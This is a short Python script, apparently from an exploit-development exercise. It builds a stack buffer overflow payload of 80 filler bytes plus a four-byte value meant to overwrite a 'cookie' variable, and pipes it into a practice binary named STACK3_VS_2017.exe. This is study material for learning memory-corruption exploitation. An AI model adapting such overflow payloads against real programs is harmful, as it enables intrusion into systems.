import sys
from subprocess import Popen, PIPE

buffer = b"A" * 80
cookie = b"\x05\x00\x02\x01"

payload = buffer + cookie

p1 = Popen("STACK3_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()
